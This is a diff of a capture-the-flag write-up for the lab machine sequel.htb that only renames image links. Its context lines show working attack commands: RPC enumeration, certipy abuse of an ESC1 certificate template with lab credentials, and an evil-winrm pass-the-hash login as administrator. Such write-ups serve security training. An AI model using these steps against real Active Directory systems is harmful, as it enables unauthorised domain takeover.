@@ -191,7 +191,7 @@ impacket-rpcdump -p 135 10.129.229.159
 
 #### rpcclient:
 
-<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (7).png" alt=""><figcaption></figcaption></figure>
 
 No success
 
@@ -509,7 +509,7 @@ Using the syntax for exploit ESC1 template:
 certipy req -username Ryan.Cooper@sequel.htb -password NuclearMosquito3 -ca sequel-DC-CA -target ca.sequel.htb -template UserAuthentication -upn administrator@sequel.htb -dns dc.sequel.htb
 ```
 
-<figure><img src="../../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (64) (2).png" alt=""><figcaption></figcaption></figure>
 
 ```
 certipy auth -pfx 'administrator_dc.pfx'
@@ -533,4 +533,3 @@ evil-winrm -i sequel.htb -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
 ```
 
 Go and grab that root.txt!
-
